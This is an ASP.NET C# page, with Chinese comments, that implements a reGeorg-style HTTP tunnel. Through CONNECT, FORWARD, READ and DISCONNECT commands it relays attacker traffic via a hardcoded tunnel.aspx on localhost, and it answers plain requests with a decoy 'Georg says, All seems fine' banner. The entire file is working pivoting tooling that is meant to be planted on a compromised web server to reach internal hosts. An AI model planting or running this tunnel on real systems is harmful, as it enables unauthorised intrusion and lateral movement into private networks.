<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<%
    string forwardURL = "http://127.0.0.1/tunnel.aspx";
    try
    {
        if (Request.HttpMethod == "POST")
        {

            //获得post参数，写入forward
            string cmd =  Request.QueryString.Get("cmd").ToUpper();
            string cmdString = string.Format("cmd={0}", cmd);
            CookieContainer cookieContainer;
            if (cmd == "CONNECT")
            {
                String target = Request.QueryString.Get("target").ToUpper();
                //Request.Headers.Get("X-TARGET");
                int port = int.Parse(Request.QueryString.Get("port"));
                cmdString = string.Format("cmd={0}&target={1}&port={2}", cmd, target, port);
                cookieContainer = new CookieContainer();
                Session.Add("cookieContainer", cookieContainer);
            }
            else
            {
                cookieContainer = (CookieContainer)Session["cookieContainer"];
            }
            if (cmdString != "")
            {
                forwardURL = forwardURL + "?" + cmdString;
            } 
            HttpWebRequest forwardRequest = WebRequest.Create(forwardURL) as HttpWebRequest;
            forwardRequest.Method = "POST";
            forwardRequest.ContentType = Request.ContentType;
            forwardRequest.CookieContainer = cookieContainer;
            forwardRequest.KeepAlive = true;
            //forwardRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1";
            //forwardRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            //获得其他header,没有其他header.
    
            //获得数据长度
            
            forwardRequest.ContentLength = Request.ContentLength;
            Response.AddHeader("X-STATUS", "OK");
            if (cmd == "FORWARD"){
                Stream requestWriter = (forwardRequest.GetRequestStream());
                //写入其他数据
                int buffLen = Request.ContentLength;
                if (buffLen > 0){
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                    {
                        byte[] newBuff = new byte[c];
                        //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                        System.Buffer.BlockCopy(buff, 0, newBuff, 0, c);
                        requestWriter.Write(newBuff, 0, c);
                    }
                    //requestWriter.Close();
                }
                HttpWebResponse response = (HttpWebResponse) forwardRequest.GetResponse();
            }
            
            if (cmd == "CONNECT")
            {
                HttpWebResponse response = (HttpWebResponse) forwardRequest.GetResponse();
                foreach (Cookie cook in response.Cookies)
                {
                    cookieContainer.Add(cook);
                }
            }
            if (cmd == "DISCONNECT")
            {
                HttpWebResponse response = (HttpWebResponse) forwardRequest.GetResponse();
                Session.Abandon();
            }
            //读取数据并返回
            if (cmd == "READ")
            {
               
                try{
                    MemoryStream ms = new MemoryStream();
                    Stream st = forwardRequest.GetResponse().GetResponseStream();
                    byte[] buff = new byte[512];
                    int read = 0;
                    while ((read = st.Read(buff, 0, buff.Length)) > 0)
                    {
                        byte[] newBuff = new byte[read];
                        //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                        System.Buffer.BlockCopy(buff, 0, newBuff, 0, read);
                        Response.BinaryWrite(newBuff);
                    }
                    
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
                
            }
            //读取到0字节？
        }
        else 
        {
            Response.Write("Georg says, 'All seems fine'");
        }
    }
    catch (Exception e)
    {
        Response.AddHeader("X-ERROR", e.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>

